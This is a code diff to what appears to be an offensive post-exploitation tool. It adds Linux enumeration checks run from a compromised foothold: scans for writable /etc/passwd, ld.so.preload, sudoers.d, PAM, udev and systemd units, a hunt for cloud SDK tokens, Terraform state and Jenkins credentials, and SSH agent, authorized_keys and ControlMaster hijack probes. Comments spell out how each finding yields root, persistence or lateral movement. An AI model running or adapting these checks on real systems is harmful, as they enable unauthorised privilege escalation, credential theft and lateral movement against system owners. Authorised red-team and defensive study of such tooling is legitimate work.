@@ -71,6 +71,63 @@ ENUM_PLAN = {
                   "ls /sys/class/net 2>/dev/null | grep -qE "
                   "  '^(docker0|cni|flannel|br-|weave|cali|tunl)' "
                   "  && echo 'FK-HOSTNETWORK'"),
+        # Hygiene / writable-config scan (axis 1). One SSH round-trip gathers
+        # five independent privesc / persistence primitives: each `test -w`
+        # tag emits a known marker so :func:`_p_hygiene` can set the right
+        # fact without ambiguity. Expensive directory walks (sudoers.d /
+        # pam / udev / systemd user units) are capped at 1 level + 20 hits
+        # so a weird / huge /etc doesn't stall the shell.
+        EnumCheck("hygiene",
+                  "test -w /etc/ld.so.preload && echo 'FK-LDSP-WRITE'; "
+                  "test -w /etc/passwd && echo 'FK-PASSWD-WRITE'; "
+                  "find /etc/sudoers.d -maxdepth 1 -type f -writable 2>/dev/null "
+                  "  | head -20 | sed 's/^/FK-SUDOERSD /'; "
+                  "find /lib/x86_64-linux-gnu/security /lib/security "
+                  "     /usr/lib/x86_64-linux-gnu/security /usr/lib/security "
+                  "     -maxdepth 1 -type f -writable 2>/dev/null "
+                  "  | head -20 | sed 's/^/FK-PAM /'; "
+                  "find /etc/udev/rules.d /lib/udev/rules.d "
+                  "     -maxdepth 1 -type f -writable 2>/dev/null "
+                  "  | head -20 | sed 's/^/FK-UDEV /'; "
+                  "find \"$HOME/.config/systemd/user\" -maxdepth 2 -type f -writable "
+                  "     \\( -name '*.service' -o -name '*.timer' \\) 2>/dev/null "
+                  "  | head -20 | sed 's/^/FK-SYSD-USER /'"),
+        # Cloud-SDK token hunt (axis 1 — cred loot). Walks the standard
+        # per-user caches that most CLI tooling drops long-lived tokens into.
+        # Each hit emits ``FK-TOKEN <provider> <path>`` for the parser to
+        # route into facts.cloud_sdk_tokens. Terraform / Jenkins are called
+        # out separately because their paths are less user-local.
+        EnumCheck("cloud_tokens",
+                  "for p in \"$HOME/.docker/config.json\" "
+                  "         \"$HOME/.kube/config\" "
+                  "         \"$HOME/.aws/credentials\" "
+                  "         \"$HOME/.aws/config\" "
+                  "         \"$HOME/.config/gcloud/application_default_credentials.json\" "
+                  "         \"$HOME/.config/doctl/config.yaml\" "
+                  "         \"$HOME/.azure/accessTokens.json\"; do "
+                  "  [ -r \"$p\" ] && echo \"FK-TOKEN $p\"; "
+                  "done; "
+                  "[ -d \"$HOME/.aws/sso/cache\" ] && ls \"$HOME/.aws/sso/cache\" 2>/dev/null "
+                  "  | sed \"s|^|FK-TOKEN $HOME/.aws/sso/cache/|\"; "
+                  "find / -maxdepth 5 -type f -name '*.tfstate' -readable 2>/dev/null "
+                  "  | head -10 | sed 's/^/FK-TFSTATE /'; "
+                  "find /var/lib/jenkins /var/jenkins_home /home/jenkins "
+                  "     -maxdepth 3 -type f -name 'credentials.xml' -readable 2>/dev/null "
+                  "  | head -5 | sed 's/^/FK-JENKINS /'"),
+        # SSH-env / lateral primitives (axis 1 — lateral movement). Captures
+        # SSH_AUTH_SOCK (agent hijack), writable foreign authorized_keys
+        # (key-plant lateral), ControlMaster sockets (session hijack), and
+        # the user's known_hosts (lateral-target enumeration).
+        EnumCheck("ssh_env",
+                  "[ -S \"$SSH_AUTH_SOCK\" ] && [ -r \"$SSH_AUTH_SOCK\" ] "
+                  "  && echo 'FK-SSHAGENT'; "
+                  "for ak in /home/*/.ssh/authorized_keys /root/.ssh/authorized_keys; do "
+                  "  [ -w \"$ak\" ] && echo \"FK-AUTHKEYS $ak\"; "
+                  "done; "
+                  "ls ~/.ssh/control-* 2>/dev/null | sed 's/^/FK-CONTROLPATH /'; "
+                  "[ -r \"$HOME/.ssh/known_hosts\" ] "
+                  "  && awk -F'[ ,]' '/^[^#|]/{print \"FK-KNOWNHOST \" $1}' "
+                  "       \"$HOME/.ssh/known_hosts\" 2>/dev/null | head -30"),
     ),
     WINDOWS: (
         EnumCheck("priv", "whoami /priv"),
@@ -164,6 +221,59 @@ class HostFacts:
     #: can sniff the node's traffic, hit localhost-bound services on the
     #: node (kubelet's 10248/10250), and reach cluster peers.
     has_hostnetwork: bool = False
+    # -- linux · hygiene / writable-config primitives (axis 1) --
+    #: ``True`` when ``/etc/ld.so.preload`` is writable by the foothold user —
+    #: a one-line write there injects a shared library into every subsequent
+    #: process on the box, root included. Root-equivalent LPE on next sudo.
+    writable_ld_so_preload: bool = False
+    #: ``True`` when ``/etc/passwd`` is writable — the classic "append a UID-0
+    #: line with a known pass hash" primitive. Still happens on hardened
+    #: appliances / NAS boxes with permissive defaults.
+    writable_passwd: bool = False
+    #: Writable paths under ``/etc/sudoers.d/`` the foothold can edit → add
+    #: your own ``NOPASSWD: ALL`` entry. More subtle than writing /etc/passwd
+    #: because sudoers.d is designed to be modular.
+    writable_sudoers_d: list = field(default_factory=list)
+    #: Writable PAM module paths (``pam_exec.so`` dropped into ``/lib/x86_64-
+    #: linux-gnu/security/`` or similar) → every ``sudo`` / ``su`` / ``sshd``
+    #: login runs the attacker command. Persistence primitive.
+    writable_pam_modules: list = field(default_factory=list)
+    #: Writable udev rule paths (``/etc/udev/rules.d/*.rules``) → persistence
+    #: that triggers on hardware events (USB plug, device load).
+    writable_udev_rules: list = field(default_factory=list)
+    #: Writable per-user systemd unit paths (``~/.config/systemd/user/*``) →
+    #: persistence surviving reboot without needing root.
+    writable_systemd_user_units: list = field(default_factory=list)
+    # -- linux · credential loot (axis 1) --
+    #: ``True`` when ``$SSH_AUTH_SOCK`` is set + the socket is readable, so
+    #: the foothold can hijack the agent (``ssh-add -L``, use for new
+    #: outbound auths) without ever seeing the private key.
+    ssh_agent_sock_hijackable: bool = False
+    #: Readable cloud-SDK credential paths by provider (``docker`` →
+    #: ``~/.docker/config.json``, ``kubectl`` → ``~/.kube/config``, ``aws``
+    #: → ``~/.aws/sso/cache/*``, …). Each is a credential that typically
+    #: outranks the foothold user's shell privs.
+    cloud_sdk_tokens: dict = field(default_factory=dict)
+    #: Terraform state files discovered — frequent source of long-lived
+    #: cloud secrets left in cleartext under ``outputs`` or ``resources``.
+    terraform_states: list = field(default_factory=list)
+    #: Jenkins ``credentials.xml`` paths — contain encrypted creds + the
+    #: master key sits beside them (``master.key`` + ``hudson.util.
+    #: Secret``) so decryption is a local-only operation.
+    jenkins_credentials: list = field(default_factory=list)
+    # -- linux · lateral movement (axis 1) --
+    #: Other-user ``~/.ssh/authorized_keys`` files writable by the current
+    #: user — write our pubkey, SSH in as that user, chain further.
+    writable_authorized_keys: list = field(default_factory=list)
+    #: Hosts referenced in the foothold user's SSH ``known_hosts`` + each
+    #: user's private-key existence (``~/.ssh/id_*``). Feeds a key-reuse
+    #: map: a key that unlocks these hosts likely unlocks more.
+    ssh_known_hosts: list = field(default_factory=list)
+    #: Active SSH ``ControlMaster`` sockets (``~/.ssh/control-*``) — any
+    #: process using the same control path piggybacks on an authenticated
+    #: session WITHOUT re-authing (no password, no key prompt). Hijacks a
+    #: logged-in session.
+    ssh_controlpath_sockets: list = field(default_factory=list)
     # -- windows --
     privs: set = field(default_factory=set)            # SeImpersonatePrivilege, ...
     win_groups: set = field(default_factory=set)        # Administrators, Backup Operators, ...
@@ -182,6 +292,32 @@ class HostFacts:
     @property
     def is_root(self):
         return self.uid == 0
+
+    # --- `has_*` convenience booleans so TTPs can write a one-liner
+    # `facts_match: {has_X: true}` predicate instead of needing a new
+    # per-list adapter rule. Each is cheap (truthiness of the backing
+    # list / dict) and the strict-equality facts_match semantics work
+    # with properties fine via getattr().
+    @property
+    def has_writable_sudoers_d(self):      return bool(self.writable_sudoers_d)
+    @property
+    def has_writable_pam_modules(self):    return bool(self.writable_pam_modules)
+    @property
+    def has_writable_udev_rules(self):     return bool(self.writable_udev_rules)
+    @property
+    def has_writable_systemd_user(self):   return bool(self.writable_systemd_user_units)
+    @property
+    def has_cloud_sdk_tokens(self):        return bool(self.cloud_sdk_tokens)
+    @property
+    def has_terraform_states(self):        return bool(self.terraform_states)
+    @property
+    def has_jenkins_credentials(self):     return bool(self.jenkins_credentials)
+    @property
+    def has_writable_authorized_keys(self): return bool(self.writable_authorized_keys)
+    @property
+    def has_ssh_controlpath_sockets(self): return bool(self.ssh_controlpath_sockets)
+    @property
+    def has_ssh_known_hosts(self):         return bool(self.ssh_known_hosts)
 
 
 # --------------------------------------------------------------------------- run
@@ -422,6 +558,79 @@ def _p_container(facts, text):
         facts.has_hostnetwork = True
 
 
+def _p_hygiene(facts, text):
+    """``hygiene`` check output → set the five writable-config facts. Each
+    primitive gets its own ``FK-...`` marker so one line of grep output
+    corresponds to exactly one fact — no inference from blank-vs-not-blank."""
+    for line in text.splitlines():
+        line = line.strip()
+        if line == "FK-LDSP-WRITE":
+            facts.writable_ld_so_preload = True
+        elif line == "FK-PASSWD-WRITE":
+            facts.writable_passwd = True
+        elif line.startswith("FK-SUDOERSD "):
+            facts.writable_sudoers_d.append(line[len("FK-SUDOERSD "):])
+        elif line.startswith("FK-PAM "):
+            facts.writable_pam_modules.append(line[len("FK-PAM "):])
+        elif line.startswith("FK-UDEV "):
+            facts.writable_udev_rules.append(line[len("FK-UDEV "):])
+        elif line.startswith("FK-SYSD-USER "):
+            facts.writable_systemd_user_units.append(line[len("FK-SYSD-USER "):])
+
+
+#: Credential-loot path → provider name. The ``cloud_tokens`` enum output
+#: carries ``FK-TOKEN <path>`` lines; we classify by path prefix so a
+#: ``~/.aws/sso/cache/xyz.json`` groups under ``aws`` the same way a
+#: ``~/.aws/credentials`` would.
+_CLOUD_SDK_PATHS = (
+    ("docker",     ".docker/config.json"),
+    ("kubectl",    ".kube/config"),
+    ("aws",        ".aws/"),
+    ("gcloud",     ".config/gcloud/"),
+    ("doctl",      ".config/doctl/"),
+    ("azure",      ".azure/"),
+)
+
+
+def _p_cloud_tokens(facts, text):
+    """``cloud_tokens`` check output → set ``facts.cloud_sdk_tokens``,
+    ``.terraform_states``, ``.jenkins_credentials``. One shell round-trip
+    hunts every known per-user long-lived credential cache; the parser
+    routes each hit to the right field by its marker prefix."""
+    for line in text.splitlines():
+        line = line.strip()
+        if line.startswith("FK-TOKEN "):
+            path = line[len("FK-TOKEN "):]
+            # Classify by sdk path fragment — a single provider may have
+            # several hit paths (aws/credentials + aws/config + aws/sso/
+            # cache/*), so we accumulate into a list under the key.
+            for provider, needle in _CLOUD_SDK_PATHS:
+                if needle in path:
+                    facts.cloud_sdk_tokens.setdefault(provider, []).append(path)
+                    break
+        elif line.startswith("FK-TFSTATE "):
+            facts.terraform_states.append(line[len("FK-TFSTATE "):])
+        elif line.startswith("FK-JENKINS "):
+            facts.jenkins_credentials.append(line[len("FK-JENKINS "):])
+
+
+def _p_ssh_env(facts, text):
+    """``ssh_env`` check output → SSH-centric lateral-movement facts.
+    SSH_AUTH_SOCK presence (agent hijack), writable foreign authorized_keys
+    (key-plant lateral), ControlMaster sockets (session piggyback),
+    known_hosts entries (where this foothold has already SSHed)."""
+    for line in text.splitlines():
+        line = line.strip()
+        if line == "FK-SSHAGENT":
+            facts.ssh_agent_sock_hijackable = True
+        elif line.startswith("FK-AUTHKEYS "):
+            facts.writable_authorized_keys.append(line[len("FK-AUTHKEYS "):])
+        elif line.startswith("FK-CONTROLPATH "):
+            facts.ssh_controlpath_sockets.append(line[len("FK-CONTROLPATH "):])
+        elif line.startswith("FK-KNOWNHOST "):
+            facts.ssh_known_hosts.append(line[len("FK-KNOWNHOST "):])
+
+
 def _p_versions(facts, text):
     """sudo/pkexec(polkit)/glibc versions from the combined version print."""
     m = re.search(r"Sudo version\s+(\S+)", text, re.I)
@@ -566,6 +775,8 @@ def _p_svcperms(facts, text):
 _PARSERS = {
     "id": _p_id, "sudo": _p_sudo, "suid": _p_suid, "caps": _p_caps, "kernel": _p_kernel,
     "versions": _p_versions, "container": _p_container,
+    # axis 1 — Linux depth: hygiene + credential loot + SSH-env probes
+    "hygiene": _p_hygiene, "cloud_tokens": _p_cloud_tokens, "ssh_env": _p_ssh_env,
     "priv": _p_priv, "groups": _p_groups, "aie": _p_aie, "services": _p_services,
     "sysinfo": _p_sysinfo, "hotfixes": _p_hotfixes,
     "svcperms": _p_svcperms,
